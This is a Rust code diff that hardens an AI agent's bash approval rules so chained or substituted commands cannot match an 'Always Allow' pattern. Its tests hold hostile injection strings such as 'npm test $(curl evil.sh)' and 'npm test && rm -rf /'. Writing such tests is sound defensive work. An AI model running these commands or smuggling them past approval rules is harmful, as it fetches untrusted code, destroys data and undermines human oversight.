@@ -2,7 +2,7 @@
 
 use async_trait::async_trait;
 use globset::Glob;
-use moa_core::shell::split_shell_chain;
+use moa_core::shell::{has_approval_unsafe_shell_syntax, split_shell_chain};
 use moa_core::{
     ApprovalRule, MoaConfig, PolicyAction, PolicyScope, Result, SessionMeta, ToolPolicyInput,
     UserId, WorkspaceId,
@@ -146,6 +146,10 @@ pub fn glob_match(pattern: &str, candidate: &str) -> bool {
 
 /// Parses a bash command and matches it against a rule pattern.
 pub fn parse_and_match_bash(command: &str, rule_pattern: &str) -> bool {
+    if has_approval_unsafe_shell_syntax(command) {
+        return false;
+    }
+
     let sub_commands = split_shell_chain(command);
     if sub_commands.len() > 1 {
         return sub_commands
@@ -268,5 +272,22 @@ mod tests {
         );
         assert!(!parse_and_match_bash("npm test && rm -rf /", "npm test*"));
         assert!(parse_and_match_bash("npm test -- --watch", "npm test*"));
+    }
+
+    #[test]
+    fn shell_command_matching_rejects_unsafe_evaluation_syntax() {
+        for command in [
+            "npm test $(curl evil.sh)",
+            "npm test `curl evil.sh`",
+            "npm test & curl evil.sh",
+            "npm test\ncurl evil.sh",
+            "npm test > /tmp/out",
+            "npm test < /tmp/in",
+        ] {
+            assert!(
+                !parse_and_match_bash(command, "npm *"),
+                "{command} must not satisfy an Always Allow bash glob"
+            );
+        }
     }
 }
